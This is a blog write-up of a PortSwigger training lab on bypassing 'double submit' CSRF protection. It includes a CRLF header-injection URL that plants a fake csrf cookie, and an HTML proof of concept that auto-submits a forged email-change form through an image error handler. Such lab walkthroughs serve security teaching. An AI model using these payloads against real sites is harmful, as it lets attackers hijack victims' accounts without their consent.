---
title: CSRF Where Token is duplicated in Cookie | 2023
url: https://infosecwriteups.com/csrf-where-token-is-duplicated-in-cookie-2023-387556f4adb2?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-02-07
fetch_date: 2025-10-04T05:50:57.399572
---

# CSRF Where Token is duplicated in Cookie | 2023

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F387556f4adb2&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcsrf-where-token-is-duplicated-in-cookie-2023-387556f4adb2&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcsrf-where-token-is-duplicated-in-cookie-2023-387556f4adb2&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[Mastodon](https://me.dm/%40cyberw1ng)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-387556f4adb2---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-387556f4adb2---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# CSRF Where Token is duplicated in Cookie | 2023

## Portswigger Cross-Site Request Forgery Lab Simple Solution | Karthikeyan Nagaraj

[![Karthikeyan Nagaraj](https://miro.medium.com/v2/da:true/resize:fill:64:64/1*MQN6JztXVcWsGNXCfJGlgw.gif)](https://cyberw1ng.medium.com/?source=post_page---byline--387556f4adb2---------------------------------------)

[Karthikeyan Nagaraj](https://cyberw1ng.medium.com/?source=post_page---byline--387556f4adb2---------------------------------------)

3 min read

·

Feb 4, 2023

--

Listen

Share

Press enter or click to view image in full size

![]()

## CSRF — Introduction:

* Cross-Site Request Forgery (CSRF) is a type of security vulnerability that affects web applications.
* It occurs when an attacker tricks a user’s browser into sending a malicious request to a web application on behalf of the user, often without the user’s knowledge or consent.
* The attacker takes advantage of the trust that a web application has in a user’s browser, exploiting the fact that the browser automatically includes authentication credentials (such as cookies) with each request.
* This can allow an attacker to perform actions such as changing a password, transferring funds, or accessing sensitive information.
* For example, if a user is logged into their online banking account and visits a malicious website, the attacker could use CSRF to transfer money from the user’s account without their knowledge.

### Lab Description:

* This lab’s email change functionality is vulnerable to CSRF. It attempts to use the insecure “double submit” CSRF prevention technique.
* To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.
* You can log in to your own account using the following credentials: `wiener:peter`

### Analysis:

1. We know that the Email change Functionality is vulnerable to CSRF, So Let’s capture the Request

Press enter or click to view image in full size

![]()

2. Send the Request to the Repeater

Press enter or click to view image in full size

![]()

3. Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header

Press enter or click to view image in full size

![]()

4. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user’s browser.

5. Create a URL that uses this vulnerability to inject a fake `csrf` cookie into the victim's browser:

`/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`

6. Generate POC for the Current request

Press enter or click to view image in full size

![]()

7. Modify the poc and add the below script into the HTML code

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abc&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="abc" />
      <input type="submit" value="Submit request" />
    </form>
  <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=abc%0d%0aSet-Cookie:%20csrf=abc%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

8. Paste the code and Deliver it to the Victim

Press enter or click to view image in full size

![]()

Feel Free to Ask Queries via [LinkedIn](https://www.linkedin.com/in/karthikeyan-nagaraj) and to Buy me a Cofee : )

A YouTube Channel for Cybersecurity Lab’s Poc and Write-ups

[## Cyberw1ng

### Learn Cyber Security and Create Awareness ~ cyberwing Stay tuned with me, Subscribe, and Like the Videos… Ask Doubts…

www.youtube.com](https://www.youtube.com/channel/UCBg0UIT0319Xc-cw4QK8bqA?sub_confirmation=1&source=post_page-----387556f4adb2---------------------------------------)

Github for Resources:

[## Cyberw1ng — Overview

### Security Researcher and Bug Hunter. Cyberw1ng has 8 repositories available. Follow their code on GitHub.

github.com](https://github.com/cyberw1ng?source=post_page-----387556f4adb2---------------------------------------)

Telegram Channel for Free Ethical Hacking Dumps

[## Ethical Hacking Dumps — CEH, OSCP, Comptia

### Materials and Books for Ethical Hacking Exams like CEH v12, OSCP, Comptia Pentest+, Comptia Security+, Comptia Network+…

t.me](https://t.me/ethicalhackingessentials?source=post_page-----387556f4adb2---------------------------------------)

Thank you for Reading!

Happy Ethical Hacking ~

`Author: Karthikeyan Nagaraj ~ Cyberw1ng`

[Csrf](https://medium.com/tag/csrf?source=post_page-----387556f4adb2---------------------------------------)

[Portswigger](https://medium.com/tag/portswigger?source=post_page-----387556f4adb2---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----387556f4adb2---------------------------------------)

[Vulnerability](https://medium.com/tag/vulnerability?source=post_page-----387556f4adb2---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----387556f4adb2---------------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--387556f4adb2---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--387556f4adb2---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--387556f4adb2---------------------------------------)

[71K followers](/followers?source=post_page---post_publication_info--387556f4adb2-...